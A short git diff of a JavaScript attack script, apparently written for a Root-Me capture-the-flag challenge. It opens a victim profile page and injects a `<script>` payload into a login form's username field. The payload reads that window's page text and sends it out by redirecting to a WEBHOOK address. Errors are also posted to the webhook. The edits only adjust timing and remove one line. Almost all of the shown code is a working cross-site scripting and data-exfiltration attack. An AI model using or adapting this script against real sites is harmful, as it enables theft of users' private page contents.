@@ -20,9 +20,7 @@ function post(url, data) {
 // const id = urlParams.get("id");
 
 try {
-  document.getElementById("waitimg").onerror = `window.location = "${PROFILE}"`;
-
-  const profile = window.open(PROFILE, "rootme");
+  window.open(PROFILE, "rootme");
 
   const payload = `
 const profile = window.open("", "rootme");
@@ -31,7 +29,7 @@ window.location = "${WEBHOOK}?" + profile.document.body.innerText;
   document.getElementById("username").value = `<script>${payload}</script>`;
   document.getElementById("login").submit();
 
-  setTimeout(() => (window.location = PROFILE), 1000);
+  setTimeout(() => (window.location = PROFILE), 4000);
 } catch (error) {
   post(WEBHOOK, `Error ${id}: ${error}`);
 }
